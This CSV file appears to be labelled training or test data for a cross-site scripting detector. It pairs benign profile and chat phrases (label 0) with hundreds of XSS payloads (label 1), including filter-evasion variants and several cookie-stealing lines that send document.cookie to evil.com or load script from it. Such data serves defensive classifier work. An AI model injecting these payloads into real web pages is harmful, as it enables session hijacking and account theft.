input,label
What a beautiful day,0
<body onload=alert('XSS')>,1
What a beautiful day,0
10 years of experience,0
Have a safe trip,0
Reading a great book Thanks!,0
<script>window.location='http://evil.com'</script>,1
<INPUT TYPE='IMAGE' SRC='javascript:alert(1)'>,1
My name is John Doe,0
Looking good!,0
Looking forward to hearing from you,0
<script>fetch('http://evil.com?cookie='+document.cookie)</script>,1
<script>alert(1)</script>,1
Enjoy your weekend Awesome!,0
Enjoy your weekend,0
<select onfocus=alert('XSS') autofocus>,1
<iframe src=javascript:alert('XSS')>,1
<STYLE>.XSS{background-image:url('javascript:alert(1)');}</STYLE>,1
<video src=1 onerror=alert(1)>,1
Have a wonderful day,0
<script>fetch('http://evil.com?cookie='+document.cookie)</script>,1
Nice to meet you 👍,0
<IMG LOWSRC='javascript:alert(1)'>,1
I'm interested in your services 👍,0
Please send me details 👍,0
Please visit https://example.com for more info,0
Have a wonderful day,0
<script>var i=new Image;i.src='http://evil.com/?'+document.cookie;</script>,1
<STYLE>@im\port'\ja\vasc\ript:alert(1)';</STYLE>,1
10 years of experience,0
10 years of experience 😊,0
"<script>sessionStorage.setItem('xss','stored')</script>",1
I'm interested in your services,0
Happy birthday! 🎉,0
<base href='javascript:alert(1)//>,1
I'll get back to you soon 👍,0
"<embed src='data:text/html,<script>alert(1)</script>'>",1
Specializing in web development,0
Let me know if you need anything Thanks!,0
Please visit https://example.com for more info Perfect!,0
<BR SIZE='&{alert(1)}'>,1
&#60;script&#62;alert('XSS')&#60;/script&#62;,1
"""><script>alert(1)</script>",1
<scr<script>ipt>alert(1)</scr</script>ipt>,1
<style>@import'javascript:alert(1)';</style>,1
<a href='javascript:alert(1)'>click</a>,1
<audio src=1 onerror=alert(1)>,1
\x3cscript\x3ealert('XSS')\x3c/script\x3e,1
<TABLE><TD BACKGROUND='javascript:alert(1)'>,1
Available for consultation,0
<form action='javascript:alert(1)'><input type='submit'></form>,1
Welcome to my profile!,0
&#60;script&#62;alert('XSS')&#60;/script&#62;,1
<iframe src=javascript:alert('XSS')>,1
<IMG SRC=javascript:alert('XSS')>,1
What a beautiful day 👍,0
This is very helpful,0
<IMG SRC=javascript:alert('XSS')>,1
Happy birthday! 🎉,0
Let me know if you need anything,0
<DIV STYLE='width: expression(alert(1))'>,1
<img src='x' onerror='alert(document.domain)'>,1
<svg><script>alert&#40;1&#41;</script></svg>,1
Coffee time! ☕ Great!,0
<script>eval('alert(1)')</script>,1
Great work on the project!,0
Call me at 555-1234,0
Call me at 555-1234,0
I'm interested in your services,0
Please visit https://example.com for more info 😊,0
<iframe src=javascript:alert('XSS')>,1
Have a safe trip,0
Looking good! Awesome!,0
I love this website 😊,0
Great work on the project!,0
<iframe src=j&#97;vascript:alert(1)>,1
Thank you for your feedback,0
<IMG DYNSRC='javascript:alert(1)'>,1
Please visit https://example.com for more info,0
Have a safe trip,0
Based in New York Great!,0
<isindex type=image src=1 onerror=alert(1)>,1
<input type='image' src=1 onerror=alert(1)>,1
<STYLE>li {list-style-image: url('javascript:alert(1)');}</STYLE><UL><LI>XSS,1
<FRAMESET ONLOAD=alert(1)>,1
Looking good!,0
<image src='javascript:alert(1)'>,1
<scr\x00ipt>alert('XSS')</scr\x00ipt>,1
Welcome to my profile!,0
<audio src=1 onerror=alert(1)>,1
Great work on the project!,0
'-alert(1)-',1
<BODY ONUNLOAD='alert(1)'>,1
<img src=1 href=1 onerror='javascript:alert(1)'>,1
'-alert(1)-',1
Reading a great book,0
<TABLE BACKGROUND='javascript:alert(1)'>,1
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
Best regards,0
This is very helpful,0
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>,1
Reading a great book,0
Please send me details,0
Happy birthday! 🎉,0
<img src='x' onerror='&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;'>,1
Please send me details 👍,0
<body onload=alert('XSS')>,1
<link rel='stylesheet' href='javascript:alert(1)'>,1
Count me in!,0
Please send me details,0
<STYLE>@im\port'\ja\vasc\ript:alert(1)';</STYLE>,1
\u003cscript\u003ealert('XSS')\u003c/script\u003e,1
The meeting is scheduled for 3 PM Awesome!,0
Portfolio: www.example.com,0
<TABLE><TD BACKGROUND='javascript:alert(1)'>,1
Happy birthday! 🎉 😊,0
Looking good!,0
Looking good! Awesome!,0
Congratulations on your achievement,0
%3Cscript%3Ealert('XSS')%3C/script%3E,1
<script>alert(document.cookie)</script>,1
Just finished my workout Perfect!,0
<STYLE>.XSS{background-image:url('javascript:alert(1)');}</STYLE>,1
<script>alert(1)</script>,1
Coffee time! ☕,0
<LAYER SRC='http://evil.com/xss.js'></LAYER>,1
The meeting is scheduled for 3 PM Great!,0
<iframe src=j&#97;vascript:alert(1)>,1
Call me at 555-1234,0
<form action='javascript:alert(1)'><input type='submit'></form>,1
"<embed src='data:text/html,<script>alert(1)</script>'>",1
<img src='x' onerror='&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;'>,1
<script>alert(document.cookie)</script>,1
The meeting is scheduled for 3 PM,0
<<script>alert(1)//<</script>,1
"Hello, how are you? 👍",0
<img src=x onerror=alert(1)>,1
I'm interested in your services,0
"<img src='x' onerror='eval(atob(""YWxlcnQoMSk=""))'>",1
<math><mi xlink:href='javascript:alert(1)'>click</mi></math>,1
<INPUT TYPE='IMAGE' SRC='javascript:alert(1)'>,1
<DIV STYLE='width: expression(alert(1))'>,1
<svg><script>alert(1)</script></svg>,1
<div onmouseover=alert('XSS')>hover me</div>,1
Portfolio: www.example.com,0
Just finished my workout Thanks!,0
Please send me details,0
<TABLE BACKGROUND='javascript:alert(1)'>,1
javascript:alert('XSS'),1
<IMG SRC=javascript:alert('XSS')>,1
<img src='x' onerror='&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;'>,1
What a beautiful day,0
<scr<script>ipt>alert(1)</scr</script>ipt>,1
See you tomorrow,0
Count me in!,0
Thanks for sharing Perfect!,0
<img src='x' onerror='alert(document.domain)'>,1
<form action='javascript:alert(1)'><input type='submit'></form>,1
<BGSOUND SRC='javascript:alert(1)'>,1
<img src=x onerror=\u0061lert(1)>,1
That's an interesting perspective,0
I'd like to learn more,0
<LAYER SRC='http://evil.com/xss.js'></LAYER>,1
I work as a software engineer,0
Coffee time! ☕,0
<IMG SRC='javascript:alert(1)'>,1
Best regards Awesome!,0
Looking good! Great!,0
Great job everyone,0
Please visit https://example.com for more info,0
<script>eval('alert(1)')</script>,1
<script>eval('alert(1)')</script>,1
<script>document.write('<img src=x onerror=alert(1)>')</script>,1
<STYLE>@im\port'\ja\vasc\ript:alert(1)';</STYLE>,1
<marquee onstart=alert('XSS')>,1
Please visit https://example.com for more info,0
<svg><animate onbegin=alert(1) attributeName=x>,1
<script>document.write('<img src=x onerror=alert(1)>')</script>,1
<script>new Image().src='http://evil.com/log?'+document.cookie</script>,1
Call me at 555-1234,0
I appreciate your time,0
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
<textarea onfocus=alert('XSS') autofocus>,1
Let me know if you need anything,0
"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",1
Reading a great book,0
"Hello, how are you?",0
<iframe src='javas&#99;ript:alert(1)'>,1
What a beautiful day,0
<script>alert(1)</script>,1
<TABLE><TD BACKGROUND='javascript:alert(1)'>,1
<?xml version='1.0'?><script>alert(1)</script>,1
That sounds like a plan,0
Enjoy your weekend 😊,0
<form action='javascript:alert(1)'><input type='submit'></form>,1
<IMG DYNSRC='javascript:alert(1)'>,1
Let me know if you need anything 👍,0
<script src='http://evil.com/xss.js'></script>,1
Can you help me with this?,0
That sounds like a plan,0
<script>window.location='http://evil.com'</script>,1
I'd like to learn more,0
Have a wonderful day,0
<audio src=1 onerror=alert(1)>,1
Portfolio: www.example.com,0
<script>window.location='http://evil.com'</script>,1
Keep up the good work,0
Contact me at email@example.com 👍,0
<BGSOUND SRC='javascript:alert(1)'>,1
Can you help me with this? Great!,0
<script>alert(1)</script>,1
<LINK REL='stylesheet' HREF='javascript:alert(1)'>,1
"<script>localStorage.setItem('xss','stored')</script>",1
<LINK REL='stylesheet' HREF='javascript:alert(1)'>,1
<audio src=1 onerror=alert(1)>,1
<BR SIZE='&{alert(1)}'>,1
Let me know if you need anything,0
\u003cscript\u003ealert('XSS')\u003c/script\u003e,1
Just finished my workout,0
Looking good!,0
Looking forward to hearing from you,0
I'm interested in your services,0
<marquee loop=1 onfinish=alert(1)>,1
Specializing in web development,0
<BODY ONUNLOAD='alert(1)'>,1
';alert(1);//,1
Sounds interesting,0
Can you help me with this?,0
<script>/*alert(1)*/</script>,1
Happy birthday! 🎉,0
%3Cscript%3Ealert('XSS')%3C/script%3E,1
<STYLE>li {list-style-image: url('javascript:alert(1)');}</STYLE><UL><LI>XSS,1
<script>eval('alert(1)')</script>,1
';alert(1);//,1
Sounds interesting Great!,0
Happy birthday! 🎉,0
Let me know if you need anything,0
<STYLE>@im\port'\ja\vasc\ript:alert(1)';</STYLE>,1
<marquee onstart=alert('XSS')>,1
Portfolio: www.example.com Awesome!,0
The meeting is scheduled for 3 PM,0
<svg/onload=alert(1)>,1
<script>new Image().src='http://evil.com/log?'+document.cookie</script>,1
Keep up the good work,0
Coffee time! ☕ Awesome!,0
Count me in! Perfect!,0
I work as a software engineer,0
<script>alert('XSS')</script>,1
<iframe src=javascript:alert('XSS')>,1
I agree with your point,0
<iframe src='javas&#99;ript:alert(1)'>,1
Sounds interesting,0
%3Cscript%3Ealert('XSS')%3C/script%3E,1
<img src=1 href=1 onerror='javascript:alert(1)'>,1
<style>@import'javascript:alert(1)';</style>,1
<BGSOUND SRC='javascript:alert(1)'>,1
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
Let me know if you need anything Perfect!,0
<textarea onfocus=alert('XSS') autofocus>,1
<marquee onfinish=alert(1)>,1
I love this website,0
&#60;script&#62;alert('XSS')&#60;/script&#62;,1
Enjoy your weekend,0
Thank you for your feedback,0
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
<a href='javascript:alert(1)'>click</a>,1
This is very helpful,0
Let me know if you need anything,0
Check out my portfolio,0
<TABLE BACKGROUND='javascript:alert(1)'>,1
<BODY ONUNLOAD='alert(1)'>,1
Let me know if you need anything,0
&#60;script&#62;alert('XSS')&#60;/script&#62;,1
Please visit https://example.com for more info,0
<IMG STYLE='xss:expr/*XSS*/ession(alert(1))'>,1
Have a safe trip,0
<IMG SRC=`javascript:alert('XSS')`>,1
<img src='x' onerror='&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;'>,1
<script>window.location='http://evil.com'</script>,1
See you tomorrow,0
"<script>sessionStorage.setItem('xss','stored')</script>",1
<scr<script>ipt>alert(1)</scr</script>ipt>,1
<TABLE><TD BACKGROUND='javascript:alert(1)'>,1
<math><mi xlink:href='javascript:alert(1)'>click</mi></math>,1
<style>@import'javascript:alert(1)';</style>,1
<INPUT TYPE='IMAGE' SRC='javascript:alert(1)'>,1
"<embed src='data:text/html,<script>alert(1)</script>'>",1
I agree with your point,0
<img src=x onerror=alert('XSS')>,1
Happy birthday! 🎉 Perfect!,0
Thank you for your feedback Thanks!,0
<<script>alert(1)//<</script>,1
<style>@import'javascript:alert(1)';</style>,1
Check out my portfolio Great!,0
Have a safe trip,0
See you tomorrow,0
<img src=x onerror=\u0061lert(1)>,1
<SCRipT>alert(1)</SCRipT>,1
I agree with your point,0
<svg><animate onbegin=alert(1) attributeName=x>,1
Coffee time! ☕,0
Have a wonderful day,0
<BGSOUND SRC='javascript:alert(1)'>,1
<IMG DYNSRC='javascript:alert(1)'>,1
Great work on the project!,0
<script>alert(document.cookie)</script>,1
10 years of experience,0
That's an interesting perspective,0
<form action='javascript:alert(1)'><input type='submit'></form>,1
javascript:alert('XSS'),1
Please send me details,0
<marquee loop=1 onfinish=alert(1)>,1
Congratulations on your achievement,0
<BODY ONUNLOAD='alert(1)'>,1
Based in New York,0
I'm interested in your services,0
<BGSOUND SRC='javascript:alert(1)'>,1
Please visit https://example.com for more info,0
See you tomorrow,0
Available for consultation,0
<LAYER SRC='http://evil.com/xss.js'></LAYER>,1
<input type='image' src=1 onerror=alert(1)>,1
<INPUT TYPE='IMAGE' SRC='javascript:alert(1)'>,1
Thanks for sharing,0
I'll get back to you soon,0
Call me at 555-1234,0
Happy birthday! 🎉,0
I'm interested in your services,0
Looking good!,0
<marquee onstart=alert('XSS')>,1
<base href='javascript:alert(1)//>,1
I appreciate your time Perfect!,0
Please send me details Great!,0
Can you help me with this? Awesome!,0
Thank you for your feedback,0
"<object data='data:text/html,<script>alert(1)</script>'>",1
My name is John Doe,0
<img src='x' onerror='alert(document.domain)'>,1
Reading a great book,0
<TABLE><TD BACKGROUND='javascript:alert(1)'>,1
<iframe src='javas&#99;ript:alert(1)'>,1
Have a safe trip,0
I work as a software engineer,0
That sounds like a plan Great!,0
Based in New York,0
<script><!--alert(1)--></script>,1
&#60;script&#62;alert('XSS')&#60;/script&#62;,1
<base href='javascript:alert(1)//>,1
<SCRipT>alert(1)</SCRipT>,1
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
"<img src='x' onerror='eval(atob(""YWxlcnQoMSk=""))'>",1
10 years of experience 👍,0
<script>document.write('<img src=x onerror=alert(1)>')</script>,1
&#60;script&#62;alert('XSS')&#60;/script&#62;,1
<math><mi xlink:href='javascript:alert(1)'>click</mi></math>,1
Please send me details,0
"<embed src='data:text/html,<script>alert(1)</script>'>",1
Thanks for your help 😊,0
Looking good!,0
<IMG STYLE='xss:expr/*XSS*/ession(alert(1))'>,1
<marquee onfinish=alert(1)>,1
Available for consultation,0
Welcome to my profile!,0
Have a wonderful day,0
<link rel='stylesheet' href='javascript:alert(1)'>,1
Sounds interesting,0
<img src='x' onerror='&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;'>,1
Thank you for your feedback,0
Coffee time! ☕,0
<video src=1 onerror=alert(1)>,1
<<script>alert(1)//<</script>,1
Looking good!,0
<INPUT TYPE='IMAGE' SRC='javascript:alert(1)'>,1
Happy birthday! 🎉,0
Best regards,0
<script>alert('XSS')</script>,1
Please send me details 😊,0
<LAYER SRC='http://evil.com/xss.js'></LAYER>,1
Great job everyone Perfect!,0
Just finished my workout,0
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
<video src=1 onerror=alert(1)>,1
<LAYER SRC='http://evil.com/xss.js'></LAYER>,1
I'd like to learn more Perfect!,0
<script>alert('XSS')</script>,1
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>,1
Congratulations on your achievement,0
<img src='x' onerror='alert(document.domain)'>,1
Contact me at email@example.com,0
<script src='http://evil.com/xss.js'></script>,1
<embed code='javascript:alert(1)'>,1
"Hello, how are you?",0
Happy birthday! 🎉,0
Thank you for your feedback,0
<FRAMESET ONLOAD=alert(1)>,1
Have a safe trip,0
<iframe src=javascript:alert('XSS')>,1
Count me in! Thanks!,0
Specializing in web development,0
<base href='javascript:alert(1)//>,1
<INPUT TYPE='IMAGE' SRC='javascript:alert(1)'>,1
"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",1
\u003cscript\u003ealert('XSS')\u003c/script\u003e,1
Reading a great book,0
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>,1
Great job everyone,0
<img src=1 href=1 onerror='javascript:alert(1)'>,1
10 years of experience,0
I agree with your point,0
Happy birthday! 🎉 Perfect!,0
&#60;script&#62;alert('XSS')&#60;/script&#62;,1
Can you help me with this?,0
<script>new Image().src='http://evil.com/log?'+document.cookie</script>,1
Contact me at email@example.com,0
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
<img src='x' onerror='alert(document.domain)'>,1
Congratulations on your achievement,0
Please send me details,0
I'm interested in your services,0
<IMG DYNSRC='javascript:alert(1)'>,1
<marquee loop=1 onfinish=alert(1)>,1
Enjoy your weekend,0
<BGSOUND SRC='javascript:alert(1)'>,1
<audio src=1 onerror=alert(1)>,1
The meeting is scheduled for 3 PM Awesome!,0
\x3cscript\x3ealert('XSS')\x3c/script\x3e,1
My name is John Doe,0
<img src='x' onerror='&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;'>,1
"<embed src='data:text/html,<script>alert(1)</script>'>",1
<link rel='stylesheet' href='javascript:alert(1)'>,1
<a href='javascript:alert(1)'>click</a>,1
Portfolio: www.example.com,0
<iframe src=j&#97;vascript:alert(1)>,1
Thank you for your feedback,0
Great work on the project!,0
<form action='javascript:alert(1)'><input type='submit'></form>,1
"<script>sessionStorage.setItem('xss','stored')</script>",1
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
<<script>alert(1)//<</script>,1
<marquee onstart=alert('XSS')>,1
<a href='javascript:alert(1)'>click</a>,1
My favorite color is blue Great!,0
Coffee time! ☕ 😊,0
Sounds interesting,0
<IMG LOWSRC='javascript:alert(1)'>,1
I appreciate your time,0
<IMG SRC=javascript:alert('XSS')>,1
Best regards,0
<DIV STYLE='background-image: url(javascript:alert(1))'>,1
Have a safe trip,0
Please visit https://example.com for more info,0
<script src='http://evil.com/xss.js'></script>,1
I agree with your point Perfect!,0
That sounds like a plan Great!,0
<math><mi xlink:href='javascript:alert(1)'>click</mi></math>,1
<marquee onfinish=alert(1)>,1
Just finished my workout Great!,0
<script>alert('XSS')</script>,1
&#60;script&#62;alert('XSS')&#60;/script&#62;,1
This is very helpful,0
Thank you for your feedback,0
<script>alert('XSS')</script>,1
<marquee loop=1 onfinish=alert(1)>,1
<div onmouseover=alert('XSS')>hover me</div>,1
Sounds interesting Great!,0
I love this website,0
<TABLE BACKGROUND='javascript:alert(1)'>,1
Thank you for your feedback,0
<img src='x' onerror='&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;'>,1
<BR SIZE='&{alert(1)}'>,1
<?xml version='1.0'?><script>alert(1)</script>,1
Great job everyone,0
<details open ontoggle=alert(1)>,1
I appreciate your time,0
I agree with your point 😊,0
Thanks for your help,0
<DIV STYLE='width: expression(alert(1))'>,1
I agree with your point,0
<IMG SRC='javascript:alert(1)'>,1
<BR SIZE='&{alert(1)}'>,1
<BODY BACKGROUND='javascript:alert(1)'>,1
I appreciate your time,0
<input onfocus=alert('XSS') autofocus>,1
<TABLE><TD BACKGROUND='javascript:alert(1)'>,1
<scr\x00ipt>alert('XSS')</scr\x00ipt>,1
<DIV STYLE='background-image: url(javascript:alert(1))'>,1
Looking good!,0
"<embed src='data:text/html,<script>alert(1)</script>'>",1
<embed code='javascript:alert(1)'>,1
<img src='x' onerror='&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;'>,1
Looking good!,0
I'll get back to you soon,0
Looking forward to hearing from you,0
Welcome to my profile!,0
<BODY ONUNLOAD='alert(1)'>,1
Check out my portfolio Thanks!,0
<svg><script>alert&#40;1&#41;</script></svg>,1
Have a wonderful day Great!,0
<img src='javascript:alert(1)'>,1
<script>window.location='http://evil.com'</script>,1
Portfolio: www.example.com,0
10 years of experience Great!,0
<BODY ONUNLOAD='alert(1)'>,1
Can you help me with this? 😊,0
<img src='x' onerror='alert(document.domain)'>,1
<object data='javascript:alert(1)'>,1
'-alert(1)-',1
Have a wonderful day Thanks!,0
<marquee loop=1 onfinish=alert(1)>,1
<img src='x' onerror='&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;'>,1
I appreciate your time Perfect!,0
Let me know if you need anything,0
"<iframe src='data:text/html,<script>alert(1)</script>'>",1
<INPUT TYPE='IMAGE' SRC='javascript:alert(1)'>,1
I agree with your point,0
Coffee time! ☕ Awesome!,0
I'm interested in your services,0
Thanks for sharing Awesome!,0
<style>@import'javascript:alert(1)';</style>,1
<select onfocus=alert('XSS') autofocus>,1
<input type='image' src=1 onerror=alert(1)>,1
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
Thank you for your feedback,0
<STYLE>@im\port'\ja\vasc\ript:alert(1)';</STYLE>,1
Thank you for your feedback,0
<input type='image' src=1 onerror=alert(1)>,1
<HTML xmlns:xss><?import namespace='xss' implementation='http://evil.com/xss.htc'><xss:xss>XSS</xss:xss></HTML>,1
<details open ontoggle=alert(1)>,1
Reading a great book Perfect!,0
<isindex type=image src=1 onerror=alert(1)>,1
<BR SIZE='&{alert(1)}'>,1
Portfolio: www.example.com,0
<script src='http://evil.com/xss.js'></script>,1
<IMG LOWSRC='javascript:alert(1)'>,1
\x3cscript\x3ealert('XSS')\x3c/script\x3e,1
I agree with your point,0
<style>@import'javascript:alert(1)';</style>,1
<img src=x onerror=alert('XSS')>,1
<iframe src=j&#97;vascript:alert(1)>,1
I work as a software engineer,0
Have a safe trip,0
'-alert(1)-',1
Happy birthday! 🎉 👍,0
<base href='javascript:alert(1)//>,1
Sounds interesting,0
Best regards,0
I'll get back to you soon,0
What a beautiful day,0
"Hello, how are you? Thanks!",0
Portfolio: www.example.com,0
<marquee loop=1 onfinish=alert(1)>,1
<svg><script>alert&#40;1&#41;</script></svg>,1
Great work on the project!,0
Contact me at email@example.com Awesome!,0
Great job everyone,0
Contact me at email@example.com,0
The meeting is scheduled for 3 PM Awesome!,0
<img src=x:alert(alt) onerror=eval(src) alt=xss>,1
I agree with your point,0
<LAYER SRC='http://evil.com/xss.js'></LAYER>,1
Coffee time! ☕,0
Coffee time! ☕,0
<?xml version='1.0'?><script>alert(1)</script>,1
Thanks for your help Great!,0
<input type='image' src=1 onerror=alert(1)>,1
Contact me at email@example.com,0
<img src=x:alert(alt) onerror=eval(src) alt=xss>,1
Let me know if you need anything,0
<video src=1 onerror=alert(1)>,1
<<script>alert(1)//<</script>,1
Welcome to my profile! 😊,0
<img src='x' onerror='&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;'>,1
Looking forward to hearing from you,0
"<img src='x' onerror='eval(atob(""YWxlcnQoMSk=""))'>",1
<DIV STYLE='width: expression(alert(1))'>,1
<?xml version='1.0'?><script>alert(1)</script>,1
Sounds interesting Thanks!,0
Looking good!,0
Sounds interesting,0
Looking good! Thanks!,0
<BR SIZE='&{alert(1)}'>,1
<BODY ONLOAD=alert(1)>,1
Best regards Perfect!,0
Check out my portfolio,0
Contact me at email@example.com,0
<SCRipT>alert(1)</SCRipT>,1
<image src='javascript:alert(1)'>,1
I appreciate your time Great!,0
<svg onload=alert('XSS')>,1
My favorite color is blue Great!,0
<?xml version='1.0'?><script>alert(1)</script>,1
<iframe src='javas&#99;ript:alert(1)'>,1
<IMG SRC=`javascript:alert('XSS')`>,1
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>,1
10 years of experience Perfect!,0
Happy birthday! 🎉 👍,0
<marquee onfinish=alert(1)>,1
Just finished my workout,0
<scr<script>ipt>alert(1)</scr</script>ipt>,1
<LINK REL='stylesheet' HREF='javascript:alert(1)'>,1
This is a great product,0
Available for consultation,0
<iframe src=javascript:alert('XSS')>,1
Can you help me with this?,0
Best regards,0
Nice to meet you,0
I'm interested in your services,0
Contact me at email@example.com,0
That sounds like a plan Perfect!,0
Can you help me with this? Thanks!,0
&#60;script&#62;alert('XSS')&#60;/script&#62;,1
I'll get back to you soon Thanks!,0
<script>alert(1)</script>,1
<input onfocus=alert('XSS') autofocus>,1
<<script>alert(1)//<</script>,1
Can you help me with this? 👍,0
<DIV STYLE='width: expression(alert(1))'>,1
Let me know if you need anything,0
<img src=x onerror=alert('XSS')>,1
Great work on the project! Thanks!,0
<style>@import'javascript:alert(1)';</style>,1
<link rel='stylesheet' href='javascript:alert(1)'>,1
See you tomorrow,0
Great work on the project!,0
"Hello, how are you? Thanks!",0
&#60;script&#62;alert('XSS')&#60;/script&#62;,1
I'll get back to you soon,0
Great work on the project!,0
Check out my portfolio,0
<img src=1 href=1 onerror='javascript:alert(1)'>,1
<TABLE><TD BACKGROUND='javascript:alert(1)'>,1
Call me at 555-1234,0
<svg onload=alert('XSS')>,1
<BODY BACKGROUND='javascript:alert(1)'>,1
I appreciate your time Perfect!,0
<link rel='stylesheet' href='javascript:alert(1)'>,1
"<embed src='data:text/html,<script>alert(1)</script>'>",1
<IMG SRC='javascript:alert(1)'>,1
Reading a great book,0
<BODY BACKGROUND='javascript:alert(1)'>,1
This is very helpful,0
<marquee loop=1 onfinish=alert(1)>,1
Sounds interesting,0
'-alert(1)-',1
<script>document.write('<img src=x onerror=alert(1)>')</script>,1
"<img src='x' onerror='eval(atob(""YWxlcnQoMSk=""))'>",1
Thanks for your help Awesome!,0
<BODY ONUNLOAD='alert(1)'>,1
That sounds like a plan,0
<select onfocus=alert('XSS') autofocus>,1
My favorite color is blue,0
<LAYER SRC='http://evil.com/xss.js'></LAYER>,1
Portfolio: www.example.com Great!,0
<marquee onfinish=alert(1)>,1
<STYLE>li {list-style-image: url('javascript:alert(1)');}</STYLE><UL><LI>XSS,1
<<script>alert(1)//<</script>,1
<img src=x onerror=alert('XSS')>,1
<script>alert(document.cookie)</script>,1
See you tomorrow,0
<STYLE>li {list-style-image: url('javascript:alert(1)');}</STYLE><UL><LI>XSS,1
<scr<script>ipt>alert(1)</scr</script>ipt>,1
<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,1
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>,1
<scr<script>ipt>alert(1)</scr</script>ipt>,1
Reading a great book,0
<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,1
I'll get back to you soon 😊,0
I'll get back to you soon,0
<img src=x onerror=alert('XSS')>,1
Can you help me with this?,0
Let me know if you need anything,0
I work as a software engineer,0
Based in New York,0
<TABLE BACKGROUND='javascript:alert(1)'>,1
Count me in! 👍,0
Just finished my workout,0
